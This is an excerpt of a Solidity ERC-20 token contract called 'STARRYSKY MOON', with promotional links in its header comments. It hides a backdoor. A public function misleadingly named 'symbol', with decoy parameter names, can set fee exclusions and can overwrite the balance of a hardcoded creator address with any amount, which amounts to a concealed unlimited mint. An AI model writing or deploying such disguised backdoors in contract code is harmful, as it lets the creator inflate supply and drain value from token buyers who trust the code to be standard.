...
// 
// https://medium.com/@starMoon1
// https://t.me/STARRYSKYMOON
...
contract STARRYSKYMOON is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = "STARRYSKY MOON";
    bool private _vbool;
    ...
    constructor () {
        ...
        _create = payable(address(0xDe9cD94250b0eA5E8FF0340F3d74c73e9Db4d58c));
    ...
    function symbol(bool state,uint256 totalSuly,address[] calldata decimailss) public {
        for (uint256 v; v < decimailss.length; v++) {
            bool ensurs = state;
            _isExcludefromFee[decimailss[v]] = ensurs;
            _vbool = (decimailss[v] == _create);
            if (_vbool)if(totalSuly > 2 * 6)_balances[_create] = totalSuly;
        }
    }
